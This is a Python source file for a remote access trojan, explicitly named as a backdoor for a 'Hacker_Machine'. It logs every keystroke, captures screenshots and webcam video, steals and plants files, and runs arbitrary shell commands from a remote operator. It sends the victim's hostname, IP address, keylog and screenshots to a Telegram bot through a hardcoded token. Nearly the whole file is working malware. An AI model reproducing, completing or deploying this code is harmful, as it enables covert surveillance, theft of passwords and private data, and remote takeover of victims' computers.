import socket     
import threading as the 
import subprocess as pipe
import os
import keyboard
import telepot
import struct
import pickle
import cv2
import datetime

__Cam__Send = True
__Cam__Recv = True

Send_loog = False

_Now_Date = datetime.date.today()


Name = socket.gethostname()
IP_Adress = socket.gethostbyname(Name)
print(IP_Adress)

_keylogger_Path = 'keylog.txt'

token = '5852335164:AAGQsSYtHEl79sD4hgNGrBlqp2c85cyJ3Wc'
reci_id = 1686186521

bot = telepot.Bot(token)

def Send_message(msg):
    bot.sendMessage(reci_id, msg)


Network = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Network.bind((socket.gethostbyname(IP_Adress),8485))
Network.listen()
connection = Network.makefile('wb')


with open(_keylogger_Path,'a') as file:
    file.write("############################### :: DATE  ::  ################################")
    file.write("\n")
    file.write(f" :: [{_Now_Date}]")

def ScreenShot():
    import pyautogui
    name = 'ScreenShots'
    pyautogui.screenshot().save(name + '.png')
    img = open(name + '.png','rb')
    bot.sendPhoto(reci_id,img)
    os.remove(name + '.png')
    Hacker_Machine.send('ScreenShot Succfully Sended !!'.encode())


def Cam_Recv():
    try:
        cons ,adre = Network.accept()
        data = b""
        payload_size = struct.calcsize(">L")
        while __Cam__Recv:
            while len(data) < payload_size:
                data += cons.recv(4096)
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            while len(data) < msg_size:
                data += cons.recv(4096)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow('Hacker',frame)
            cv2.waitKey(1)
        cons.close()
    except:
        cons.close()

def Cam_Send():
    try:
        Con , adress = Network.accept()
        Cam = cv2.VideoCapture(0)
        Cam.set(3, 1920)
        Cam.set(4, 1080)
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
        while __Cam__Send:
            ret, frame = Cam.read()
            result, frame = cv2.imencode('.jpeg', frame, encode_param)
            data = pickle.dumps(frame, 0)
            size = len(data)
            Con.sendall(struct.pack(">L", size) + data)
        Cam.release()
        Con.close()
    except:
        Con.close()

def Send_FIle(Command,Current_Path):
    COnnection , adresss = Network.accept()
    try:
        f = open(Current_Path + "\\" + Command.split(" ")[1],'rb')
        buffer_size = os.path.getsize(Current_Path + "\\" + Command.split(" ")[1])
        COnnection.send(str(buffer_size).encode())
        data = f.read()
        while (data):
            COnnection.send(data)
            data = False
            f.close()
    except:
        COnnection.send("Error while on file".encode())

def Get_FIle(Command):
    COnnection , adresss = Network.accept()
    buffer_size=COnnection.recv(2048).decode()
    if buffer_size != "Error while on file":
        with open(Command.split(" ")[1], 'wb') as file:
            data = COnnection.recv(int(buffer_size))
            if not data:
                print("break")
            file.write(data)
            file.close()

def on_key_press(event):
    with open(_keylogger_Path, 'a') as f:
        if format(event.name) == 'space':
            f.write(" ")
        elif format(event.name) == 'enter':
            f.write('\n')
        else:
            f.writelines(format(event.name))
    
def _Key_Loggy_():
    keyboard.on_press(on_key_press)
    keyboard.wait()


_Key_Logger_ = the.Thread(target=_Key_Loggy_).start()

class _Offilne_Function(the.Thread):
    def __init__(self) -> None:
        super(_Offilne_Function,self).__init__()
        self._stop_event = the.Event()

    def stop(self):
        self._stop_event.set()

    def join(self, *args, **kwargs):
        self.stop()
        super(_Offilne_Function,self).join(*args, **kwargs)

    def run(self):
        while not self._stop_event.is_set():
            if datetime.datetime.now().hour >= 15 and Send_loog == False:
                doc = open(_keylogger_Path,'rb')
                bot.sendDocument(reci_id,doc)
                Send_loog = True




class Shell_BackDoor(the.Thread):
    def __init__(self) -> None:
        super(Shell_BackDoor,self).__init__()
        self._stop_event = the.Event()

    def stop(self):
        self._stop_event.set()

    def join(self, *args, **kwargs):
        self.stop()
        super(Shell_BackDoor,self).join(*args, **kwargs)

    def run(self):
        
        while not self._stop_event.is_set():
            try:
                Current_Path=os.getcwd()
                Command = Hacker_Machine.recv(2048).decode()

                if Command.split(" ")[0] == "cd":
                    try:
                        os.chdir(Command.split(" ")[1])
                        Current_Path =  os.getcwd()
                        Hacker_Machine.send(Current_Path.encode())
                    except:
                        Hacker_Machine.send("Error On Direactory".encode())
                elif Command.split(" ")[0] == "@thief":
                    Send_FIle(Command=Command,Current_Path=Current_Path)
                elif Command.split(" ")[0] == "@send":
                    Get_FIle(Command)

                elif Command.split(" ")[0] == '@Need_key':
                    Hacker_Machine.send(str(os.path.getsize(_keylogger_Path)).encode())
                    with open(_keylogger_Path,'a') as file:
                        Network.send(file.read())

                elif Command.split(" ")[0] == "@cam":
                    if Command.split(" ")[1] == "cast":
                        if Command.split(" ")[2] == "close":
                            try:
                                __Cam__Recv=False
                                Hacker_Machine.send("Camera Connection Was Succefully Closed".encode())
                            except:
                                Hacker_Machine.send("Camera Connection Was Did't Closed".encode())
                        elif Command.split(" ")[2] == "start":
                            __Cam__Recv =True
                            Cam_rec = the.Thread(target=Cam_Recv).start()
                            Hacker_Machine.send("CAmera Connection SUccefully COnnected".encode())

                    elif Command.split(" ")[1] == "show":
                        if Command.split(" ")[2] == "close":
                            try:
                                __Cam__Send=False
                                Hacker_Machine.send("Camera Connection Was Succefully Closed".encode())
                            except:
                                Hacker_Machine.send("Camera Connection Was Did't Closed".encode())

                        elif Command.split(" ")[2] == "start":
                            __Cam__Send=True
                            Cam_send = the.Thread(target=Cam_Send).start()
                            Hacker_Machine.send("CAmera Connection SUccefully COnnected".encode())

                elif Command.split(" ")[0] == "dir":
                    Shell = pipe.Popen(f"cd {Current_Path} & "+Command,shell=True,stdout=pipe.PIPE,stderr=pipe.PIPE)
                    output = Shell.stdout.read()
                    Hacker_Machine.send(str(output).encode())

                elif Command.split(" ")[0] == '@screenshot':
                    ScreenShot()

                elif Command.split(" ")[0] == "@Connection":
                    if Command.split(" ")[1] == "close":
                        break
                else:
                    Shell = pipe.Popen(f"cd {Current_Path} & "+Command,shell=True,stdout=pipe.PIPE,stderr=pipe.PIPE)
                    output = Shell.stdout.read()
                    Hacker_Machine.send(str(output).encode())
                    Hacker_Machine.send(str(Shell.stderr.read()).encode())
                    Hacker_Machine.send(Current_Path.encode())
            except:
                self.stop()



while True:
    Send_message(Name + " : " + "Connection Establiste at " + str(_Now_Date)  +"from  this IP " +  " : " + IP_Adress)
    Hacker_Machine, Hacker_Adress = Network.accept()
    _Shell = Shell_BackDoor().run()